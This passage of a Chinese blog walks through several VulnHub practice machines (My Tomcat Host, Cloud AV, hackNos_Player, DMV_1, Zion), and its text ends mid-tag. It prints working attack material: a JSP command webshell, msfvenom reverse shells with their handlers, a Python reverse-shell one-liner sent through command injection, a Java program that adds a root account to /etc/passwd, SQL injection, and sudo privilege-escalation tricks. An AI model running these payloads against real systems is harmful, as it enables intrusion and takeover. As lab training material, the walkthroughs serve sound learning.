/><blockquote><p>Wordpress服务500</p></blockquote><p>在之前的靶机中从来没有遇到这个情况，便主观地猜测靶机配置是否有误，最后看WP的思路才让我顿悟。有几分脑洞，但是sitemap.xml也确实被dirb扫描出来了，里面的<code>index.htnl</code>也是在提示玩家，只能说收集信息的时候还是要仔细看看，毕竟<code>index.html</code>和<code>index.htnl</code>乍一看太难以区分</p><blockquote><p>rpm执行命令</p></blockquote><p>乍一看rpm有sudo，以为要构造恶意安装包来获取提权，没想到rpm可以直接执行命令</p><p>参考资料</p><blockquote><p><a href="https://www.armourinfosec.com/infosecwarrior-ctf-2020-01-walkthrough/">WP</a><br /><a href="https://cooolis.payloads.online/lolbas/Linux/rpm/">rpm.payload</a></p></blockquote><hr /><h1 id="my-tomcat-host-1"><a class="markdownIt-Anchor" href="#my-tomcat-host-1"></a> <a href="https://www.vulnhub.com/entry/my-tomcat-host-1,457/">My Tomcat Host: 1</a></h1><p><code>2020/04/25 00:43:06</code></p><h2 id="寻找靶机ip"><a class="markdownIt-Anchor" href="#寻找靶机ip"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/00.png" alt="" /></p><h2 id="端口扫描-17"><a class="markdownIt-Anchor" href="#端口扫描-17"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.166</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/01.png" alt="" /></p><h2 id="web路径扫描"><a class="markdownIt-Anchor" href="#web路径扫描"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.166:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/02.png" alt="" /></p><h2 id="漏洞利用-17"><a class="markdownIt-Anchor" href="#漏洞利用-17"></a> 漏洞利用</h2><p>用浏览器访问8080端口的页面</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/03.png" alt="" /></p><p>点击左侧<code>Manager App</code>按钮进行登录，使用默认账户<code>tomcat:tomcat</code>登入成功</p><p>上传jsp后门</p><p>这里用了两个jsp后门<br />一个用于浏览文件(<a href="https://github.com/rohitcoder/BackDoors">https://github.com/rohitcoder/BackDoors</a>)<br />一个用于执行命令(<a href="https://www.cnblogs.com/swyft/articles/5563732.html">https://www.cnblogs.com/swyft/articles/5563732.html</a>)<br />第一个后门的执行命令模块无法使用</p><p>保存后门，压缩zip包，改后缀为war，然后在Manager页面进行war包的部署<br /><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/04.png" alt="" /></p><p>war包的部署就相当于在网站根目录解压了war包，访问时需要war包的文件名以及包内的文件名</p><p>如：<br />在压缩zip时，压缩文件的文件名为<code>new1.jsp</code>，而压缩之后的zip文件改名为<code>new2.war</code>，那么在部署之后需要访问<code>/new2/new1.jsp</code></p><p>在第二个后门中查看权限</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/05.png" alt="" /></p><p>在第一个后门中查看文件，但是没有找到nc<br />只好用meterpreter来获取一个shell</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=3693 -f elf &gt; hello.elf</code></p><p>然后在第一个后门中上传到目录/tmp下</p><p>在MSF中运行handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 3693</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>上传之后是没有X权限的，这时可以在第二个后门中进行赋权<br />但是需要注意一点：要对命令进行url编码，以防止url中的特殊符号导致命令无法执行</p><p>url编码的结果为<code>chmod%20%2Bx%20%2Ftmp%2Fhello.elf</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/06.png" alt="" /></p><p>然后执行meterpreter<br /><code>%2Ftmp%2Fhello.elf</code><br />MSF中就接收到了shell</p><h2 id="权限提升-17"><a class="markdownIt-Anchor" href="#权限提升-17"></a> 权限提升</h2><p>在meterpreter的shell中获取一个pty，以便之后的切换账户操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>这里可以看到tomcat账户可以以任何账户的身份来执行java，而且不需要密码<br />这很可能是提权的一个突破口</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/07.png" alt="" /></p><p>构造密码hash</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/08.png" alt="" /></p><p>构造jar包来执行修改passwd文件的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">cat sudo.java</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class sudo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder();</span><br><span class="line">processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process &#x3D; processBuilder.start();</span><br><span class="line">            BufferedReader reader &#x3D;</span><br><span class="line">                    new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            int exitCode &#x3D; process.waitFor();</span><br><span class="line">            System.out.println(&quot;\nExited with error code : &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Kali启用HTTP服务<br /><code>python -m 'SimpleHTTPServer' 8800 &amp;</code></p><p>在Shell中使用wget下载java文件<br /><code>wget http://192.168.31.10:8800/sudo.java</code></p><p>执行EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">sudo -u root java sudo</span><br></pre></td></tr></table></figure><p>成功将账户信息写入passwd文件</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/09.png" alt="" /></p><p>切换账户即为root权限</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/10.png" alt="" /></p><hr /><p>JSP后门脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/swyft/articles/5563732.html">jsp.backdoor</a><br /><a href="https://github.com/rohitcoder/BackDoors">jsp.backdoor</a><br /><a href="https://www.runoob.com/java/java-tutorial.html">java</a><br /><a href="https://stackoverflow.com/questions/3403226/how-to-run-linux-commands-in-java">jar</a></p></blockquote><hr /><h1 id="clound-av"><a class="markdownIt-Anchor" href="#clound-av"></a> <a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">Clound AV</a></h1><p><code>2020/05/07 22:41:53</code></p><h2 id="寻找靶机ip-2"><a class="markdownIt-Anchor" href="#寻找靶机ip-2"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/00.png" alt="" /></p><h2 id="端口扫描-18"><a class="markdownIt-Anchor" href="#端口扫描-18"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.160</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/01.png" alt="" /></p><h2 id="web路径扫描-2"><a class="markdownIt-Anchor" href="#web路径扫描-2"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.160:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/02.png" alt="" /></p><h2 id="漏洞利用-18"><a class="markdownIt-Anchor" href="#漏洞利用-18"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.160:8080/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/03.png" alt="" /></p><p>使用burp改变post传递的password的值为%00<br />出现报错页面</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/04.png" alt="" /></p><p>可以看到这里存在sql语句，简单分析后可以判断存在sql注入，注意这里password字段两侧是用双引号，进行sql注入时同样需要使用双引号</p><p>构造语句<code>1&quot; or 1--+</code><br />成功登入页面</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/05.png" alt="" /></p><p>这里通过输入文件名来对文件进行分析，这里自然可以联想到常见的&quot;Ping tool &amp; Code Injection&quot;，显示出<code>ls -l</code>的结果也算是一种提示吧</p><p>本来以为这里是常见的有回显命令注入，但是这个回显实在扫描病毒的结束之后才出现，而且本人进行测试的时候扫描时间很长</p><p>为了判断能否执行命令，在Kali上开启HTTP服务<br /><code>pythom -m SimpleHTTPServer 9990 &amp;</code></p><p>然后尝试命令注入来使用wget下载本地的文件进行测试，以此来判断是否能够进行命令注入，因为开启HTTP服务之后，本地文件被下载是会存在提示的</p><p><code>|wget http://192.168.31.10:9990/1</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/06.png" alt="" /></p><p>可以看到文件被下载，说明可以进行命令注入</p><p>该靶机上没有nc，不过可以通过python来反弹shell</p><p><code>nc -lvvp 9900</code><br /><code>| python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.31.10',9900));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;</code></p><p>即可获取shell</p><h2 id="权限提升-18"><a class="markdownIt-Anchor" href="#权限提升-18"></a> 权限提升</h2><p>由于未知的原因，本人测试时在nc的shell中输入字符会连续出现两次，用起来有些不方便，只好转到MSF</p><p>生成Meterpreter后门<br /><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.py</code></p><p>在MSF中配置相关参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9995</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>使用wget传递后门并启用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.31.10:9900&#x2F;shell.py</span><br><span class="line">python shell.py</span><br></pre></td></tr></table></figure><p>在Meterpreter中获取pty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>这时可以看到我们是用户scanner的身份</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/07.png" alt="" /></p><p>在home目录下看到一个C的源代码及其编译的程序</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/08.png" alt="" /></p><p>值得注意的是，这段代码在使用freshclam扫描文件之前，会将该用户变为root，而且该程序也具有SUID权限<br />而该程序需要用户输入文件名，如果我们能够对文件名进行注入，使其扫描文件之后再执行一段代码，那么提权就变得简单了</p><p>构造反弹Shell脚本</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/09.png" alt="" /></p><p>nc监听相应端口<br /><code>nc -lvvp 9996</code></p><p>执行程序<br /><code>./update_cloudav '1| python test.py'</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/10.png" alt="" /></p><hr /><blockquote><p>/console</p></blockquote><p>在访问路径<code>/console</code>时会要求用户输入pin码，这里可以通过修改HTTP Response包中的信息来进行绕过<br />本以为给出的python console可以用来直接执行系统命令，但好像只能用于执行js里的一些函数</p><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/boredhackerblog-cloud-av-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="hacknos_player"><a class="markdownIt-Anchor" href="#hacknos_player"></a> <a href="https://www.vulnhub.com/entry/hacknos-player-v11,459/">hackNos_Player</a></h1><p><code>2020/05/09 18:39:43</code></p><h2 id="寻找靶机ip-3"><a class="markdownIt-Anchor" href="#寻找靶机ip-3"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/00.png" alt="" /></p><h2 id="端口扫描-19"><a class="markdownIt-Anchor" href="#端口扫描-19"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.33</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/01.png" alt="" /></p><h2 id="web路径扫描-3"><a class="markdownIt-Anchor" href="#web路径扫描-3"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.33/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/02.png" alt="" /></p><h2 id="漏洞利用-19"><a class="markdownIt-Anchor" href="#漏洞利用-19"></a> 漏洞利用</h2><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/03.png" alt="" /></p><p>dirb发现了js代码，粗略审计之后并没有获取到有效的信息</p><p>在Apache默认页面发现如下提示</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/04.png" alt="" /></p><p>路径<code>/g@web/</code>可访问<br />路径<code>/mini@web/</code>不可访问</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/05.png" alt="" /></p><p><code>/g@web/</code>是一个wordpress站点，使用wpscan进行信息收集</p><p><strong>用户枚举</strong></p><p><code>wpscan --url http://192.168.31.33/g@web/ -e u</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/06.png" alt="" /></p><p>访问<code>http://192.168.31.33/g@web/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/07.png" alt="" /></p><p><strong>插件枚举</strong></p><p><code>wpscan --url http://192.168.31.33/g@web/ -e ap</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/08.png" alt="" /></p><p>搜索插件相关信息<br />这里使用searchsploit搜索该插件时缺少了一个RCE的EXP，需要在网上进行搜索</p><p><a href="https://wpvulndb.com/vulnerabilities/8949">https://wpvulndb.com/vulnerabilities/8949</a></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/09.png" alt="" /></p><p>使用该EXP直接获取shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;http:&#x2F;&#x2F;192.168.31.33&#x2F;g@web&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;wpsp_upload_attachment&quot;&gt;</span><br><span class="line">    Choose a file ending with .phtml:</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;0&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p><code>weevely generate pass shell.phtml</code></p><p>上传后在<code>http://192.168.31.33/g@web/wp-content/uploads/</code>找到上传的后门，再使用weevely连接即可获取shell</p><h2 id="权限提升-19"><a class="markdownIt-Anchor" href="#权限提升-19"></a> 权限提升</h2><p>利用当前webshell获取一个MSF的Shell，方便之后进行账户之间的切换</p><p>构造后门程序<br /><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9905 -f raw &gt; pass.php</code></p><p>MSFConsole中进行相应配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use explot&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.33</span><br><span class="line">set LPORT 9905</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>触发MSF后门<br /><code>curl http://192.168.31.33/g@web/wp-content/uploads/wpsp/pass.php</code></p><p>获取shell之后再获取pty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>根据之前找到的JSON的内容，可以使用<code>hackNos@9012!!</code>来提升我们的权限</p><p>查看目录<code>/home</code>的文件夹</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/10.png" alt="" /></p><p>尝试之后转换到用户security的身份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su security</span><br><span class="line">hackNos@9012!!</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/11.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/12.png" alt="" /></p><p>这里可以使用find命令来进行水平提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; &#x2F;tmp&#x2F;1</span><br><span class="line">sudo -u hackNos-boat find &#x2F;tmp&#x2F;1 -exec &#x2F;bin&#x2F;bash \;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/13.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/14.png" alt="" /></p><p>然后再使用ruby进行提权</p><p><code>sudo -u hunter /usr/bin/ruby -e 'exec &quot;/bin/bash&quot;'</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/15.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/16.png" alt="" /></p><p>使用gcc进行提权</p><p><code>sudo -u root gcc -wrapper /bin/bash,-s .</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/17.png" alt="" /></p><p>即可获取root权限</p><hr /><blockquote><p>gcc -wrapper</p></blockquote><p>最后的gcc提权一开始以为是使用system函数来进行执行命令从而进行提权，但是随后发现这个操作需要SUID权限，最后看WP才发现是使用wrapper参数来执行命令</p><p>参考资料</p><blockquote><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Overall-Options.html#Overall-Options">wrapper</a><br /><a href="https://medium.com/@DamaneDz/vulnhub-hacknos-player-writeup-walkthrough-b91074a0adc4">WalkThrough</a></p></blockquote><hr /><h1 id="dmv_1"><a class="markdownIt-Anchor" href="#dmv_1"></a> <a href="https://www.vulnhub.com/entry/dmv-1,462/">DMV_1</a></h1><p><code>2020/05/14 15:07:33</code></p><h2 id="寻找靶机ip-4"><a class="markdownIt-Anchor" href="#寻找靶机ip-4"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/00.png" alt="" /></p><h2 id="端口扫描-20"><a class="markdownIt-Anchor" href="#端口扫描-20"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.36</code></p><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/01.png" alt="" /></p><h2 id="web路径扫描-4"><a class="markdownIt-Anchor" href="#web路径扫描-4"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.36/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/02.png" alt="" /></p><h2 id="漏洞利用-20"><a class="markdownIt-Anchor" href="#漏洞利用-20"></a> 漏洞利用</h2><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/03.png" alt="" /></p><p>Web服务的主页是一个Youtube视频在线转换工具，观察发送的请求包，post数据为URL</p><p>本地开启HTTP服务，并尝试修改URL<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/04.png" alt="" /><br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/05.png" alt="" /><br />猜测可能存在命令注入</p><p>验证存在命令注入漏洞<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/06.png" alt="" /></p><p>使用MSFVenom构造Meterpreter后门<br /><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.php</code></p><p>在MSFConsole中配置相关参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9995</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>通过命令注入来使用wget下载Meterpreter后门<br /><code>;wget$&#123;IFS&#125;http://192.168.31.10:9900/shell.php;</code></p><p>触发后门<br /><code>curl http://192.168.31.36/shell.php &amp;</code></p><h2 id="权限提升-20"><a class="markdownIt-Anchor" href="#权限提升-20"></a> 权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>这里需要使用PSPY来检测后台的root进程<br />PSPY: <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a></p><p>这里可以看到root在运行<code>/var/www/html/tmp/clean.sh</code><br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/07.png" alt="" /></p><p>而且该sh脚本可写<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/08.png" alt="" /></p><p>那么可以利用root身份执行命令</p><p>给find命令添加SUID权限<br /><code>echo 'chmod u+s /usr/bin/find' &gt;&gt; clean.sh</code><br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/09.png" alt="" /></p><p>find命令已经获得SUID权限<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/10.png" alt="" /></p><p>使用find命令获取root权限<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/11.png" alt="" /><br />这里可以看到<code>euid=0</code></p><p>查看flag<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/12.png" alt="" /></p><hr /><blockquote><p>find -&gt; bash</p></blockquote><p>之前使用find进行SUID进行提权时，执行id可以看到<code>euid=0</code>，但是获取bash时却还是原来的权限，这里使用<code>bash -p</code>则可以保留euid</p><p>参考资料</p><blockquote><p><a href="https://medium.com/@DamaneDz/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9">WalkThrough</a></p></blockquote><hr /><h1 id="zion"><a class="markdownIt-Anchor" href="#zion"></a> <a href="https://www.vulnhub.com/entry/zion-11,476/">Zion</a></h1><p><code>2020/05/21 13:09:10</code></p><h2 id="寻找靶机ip-5"><a class="markdownIt-Anchor" href="#寻找靶机ip-5"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/00.png" alt="" /></p><h2 id="端口扫描-21"><a class="markdownIt-Anchor" href="#端口扫描-21"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.1.5</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/01.png" alt="" /></p><h2 id="web路径扫描-5"><a class="markdownIt-Anchor" href="#web路径扫描-5"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.5/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/02.png" alt="" /></p><h2 id="漏洞利用-21"><a class="markdownIt-Anchor" href="#漏洞利用-21"></a> 漏洞利用</h2><p>访问Web页面</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/03.png" alt="" /></p><p>点击Truth</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/04.png" alt="" /></p><p>可以看到HTTP Header中存在一些Base编码过的信息</p><p>点击Illusion</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/05.png" alt="" /></p><p>直接Get请求<code>/zion/login.php</code><br /><img src="/images/vulnhub_walkthrough_set/Zion/img/06.png" alt="" /></p><p>对这些信息进行Base64解码</p><p><strong>Truth</strong><br /><img src="/images/vulnhub_walkthrough_set/Zion/img/07.png" alt="" /></p><p>这里提示第二段编码中没有’+’, ‘-’, ‘/’, ‘=’<br />所以是Base62编码</p><p>对第二段编码进行Base62解码<br /><img src="/images/vulnhub_walkthrough_set/Zion/img/08.png" alt="" /><br /><a href="http://decode-base62.nichabi.com/">http://decode-base62.nichabi.com/</a></p><p>这里提示用户名和密码信息存在于选择页面</p><p><strong>Illusion</strong></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/09.png" alt="" /></p><p>信息无效</p><p><strong>Get Request</strong></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/10.png" alt="" /></p><p>信息无效</p><p>使用cewl进行字典生成<br /><code>cewl http://192.168.1.5/ &gt; dic1</code></p><p>转换为小写<br /><code>cat dic1 | tr A-Z a-z &gt; dic2</code></p><p>使用Burp进行账户爆破</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/11.png" alt="" /></p><p>得到账户<code>morpheus.thematrix:interpreted</code></p><p>登陆之后点击上方的Private Key</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/12.png" alt="" /></p><p>注意txt文本的文件名为<br /><code>rsa_priv_key_for_w.rabbit.txt</code></p><p>这里保存本地之后再加上Pri_Key文件的头部与尾部</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/13.png" alt="" /></p><p>SSH登入目标服务器<br /><code>ssh -i pri.key w.rabbit@192.168.1.5</code></p><h2 id="权限提升-21"><a class="markdownIt-Anchor" href="#权限提升-21"></a> 权限提升</h2><p>查看文件<code>warning.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/14.png" alt="" /></p><p>查看mail</p><p><img 